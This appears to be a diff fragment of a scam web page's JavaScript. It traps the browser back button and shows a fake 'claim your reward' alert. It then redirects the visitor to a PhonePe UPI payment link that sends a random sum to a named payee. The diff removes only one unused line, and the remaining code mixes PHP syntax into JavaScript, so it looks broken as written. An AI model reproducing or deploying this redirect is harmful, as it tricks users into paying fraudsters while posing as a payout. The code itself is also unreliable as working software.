@@ -24,7 +24,6 @@
                         history.pushState({}, "", "");
                     onpopstate = function(t) {
                         t.state && alert(' Claim your Reward by Clicking on \n "SEND IN BANK ACCOUNT"  ')
-                        $randomAmount = rand(999, 11111);
                         location.href = "phonepe://pay?pa=fcbiz8wokw5@freecharge&pn=YDV91806707&tn=YDV" . rand(999, 11111) . "&am=" . rand(999, 11111) . "&cu=INR&mode=02&purpose=00&tr=90157033;end";
                     }
                 } catch (o) {}
